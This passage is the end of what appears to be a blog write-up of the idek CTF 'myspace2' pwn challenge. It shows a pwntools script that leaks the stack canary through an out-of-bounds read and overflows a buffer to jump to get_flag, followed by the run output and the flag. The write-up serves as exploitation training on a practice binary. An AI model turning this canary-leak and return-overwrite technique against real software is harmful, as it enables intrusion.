+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;13&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvn</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;canary: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>48</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=mi>8</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;get_flag&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;7&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>yay</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=s1>&#39;/home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/myspace2&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>Arch</span><span class=p>:</span>     <span class=n>amd64</span><span class=o>-</span><span class=mi>64</span><span class=o>-</span><span class=n>little</span>
+</span></span><span class=line><span class=cl>    <span class=n>RELRO</span><span class=p>:</span>    <span class=n>Partial</span> <span class=n>RELRO</span>
+</span></span><span class=line><span class=cl>    <span class=n>Stack</span><span class=p>:</span>    <span class=n>Canary</span> <span class=n>found</span>
+</span></span><span class=line><span class=cl>    <span class=n>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>unknown</span> <span class=o>-</span> <span class=n>GNU_STACK</span> <span class=n>missing</span>
+</span></span><span class=line><span class=cl>    <span class=n>PIE</span><span class=p>:</span>      <span class=n>No</span> <span class=n>PIE</span> <span class=p>(</span><span class=mh>0x400000</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>Stack</span><span class=p>:</span>    <span class=n>Executable</span>
+</span></span><span class=line><span class=cl>    <span class=n>RWX</span><span class=p>:</span>      <span class=n>Has</span> <span class=n>RWX</span> <span class=n>segments</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Starting</span> <span class=n>local</span> <span class=n>process</span> <span class=s1>&#39;./myspace2&#39;</span><span class=p>:</span> <span class=n>pid</span> <span class=mi>13557</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>myspace2</span><span class=o>.</span><span class=n>chal</span><span class=o>.</span><span class=n>idek</span><span class=o>.</span><span class=n>team</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>1337</span><span class=p>:</span> <span class=n>Done</span>
+</span></span><span class=line><span class=cl><span class=n>canary</span><span class=p>:</span> <span class=mh>0xa9a39f5714d96d00</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>shuban</span><span class=o>/</span><span class=n>Code</span><span class=o>/</span><span class=n>py_workspace</span><span class=o>/</span><span class=n>ctf</span><span class=o>/</span><span class=n>idek</span><span class=o>/</span><span class=n>pwn</span><span class=o>/</span><span class=n>attachments</span><span class=o>/</span><span class=n>sol</span><span class=o>.</span><span class=n>py</span><span class=p>:</span><span class=mi>27</span><span class=p>:</span> <span class=n>BytesWarning</span><span class=p>:</span> <span class=n>Text</span> <span class=n>is</span> <span class=ow>not</span> <span class=n>bytes</span><span class=p>;</span> <span class=n>assuming</span> <span class=n>ASCII</span><span class=p>,</span> <span class=n>no</span> <span class=n>guarantees</span><span class=o>.</span> <span class=n>See</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>docs</span><span class=o>.</span><span class=n>pwntools</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=c1>#bytes</span>
+</span></span><span class=line><span class=cl>  <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>shuban</span><span class=o>/</span><span class=n>Code</span><span class=o>/</span><span class=n>py_workspace</span><span class=o>/</span><span class=n>ctf</span><span class=o>/</span><span class=n>idek</span><span class=o>/</span><span class=n>pwn</span><span class=o>/</span><span class=n>attachments</span><span class=o>/</span><span class=n>sol</span><span class=o>.</span><span class=n>py</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span> <span class=n>BytesWarning</span><span class=p>:</span> <span class=n>Text</span> <span class=n>is</span> <span class=ow>not</span> <span class=n>bytes</span><span class=p>;</span> <span class=n>assuming</span> <span class=n>ASCII</span><span class=p>,</span> <span class=n>no</span> <span class=n>guarantees</span><span class=o>.</span> <span class=n>See</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>docs</span><span class=o>.</span><span class=n>pwntools</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=c1>#bytes</span>
+</span></span><span class=line><span class=cl>  <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;7&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Friend</span> <span class=n>updated</span><span class=o>.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mf>1.</span> <span class=n>See</span> <span class=n>Top</span> <span class=n>Friends</span>
+</span></span><span class=line><span class=cl><span class=mf>2.</span> <span class=n>Edit</span> <span class=n>Friend</span>
+</span></span><span class=line><span class=cl><span class=mf>3.</span> <span class=n>Display</span> <span class=n>Friend</span>
+</span></span><span class=line><span class=cl><span class=mf>4.</span> <span class=n>Quit</span>
+</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> 
+</span></span><span class=line><span class=cl><span class=n>idek</span><span class=p>{</span><span class=n>b4bys_1st_c00k1e_leak_yayyy</span><span class=o>!</span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>fladg</p></section><footer class=article-footer></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/pwn-ropemp/><div class=article-image><img src=/p/pwn-ropemp/cover.cc08faf9420c4d22a435b74c04b2aba9_hu_5b4562b39d07c219.png width=250 height=150 loading=lazy alt="Featured image of post ROP Emporium Full Solutions" data-key=pwn-ropemp data-hash="md5-zAj6+UIMTSKkNbdMBLKrqQ=="></div><div class=article-details><h2 class=article-title>ROP Emporium Full Solutions</h2></div></a></article><article class=has-image><a href=/p/picoctf-vne/><div class=article-image><img src=/p/picoctf-vne/cover.d21c3f9189dae79f5a5511e762e6b3a3_hu_4d19551a2e400af2.jpg width=250 height=150 loading=lazy alt="Featured image of post VNE Writeup" data-key=picoctf-vne data-hash="md5-0hw/kYna559aVRHnYuazow=="></div><div class=article-details><h2 class=article-title>VNE Writeup</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2025 Shuban Pal</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
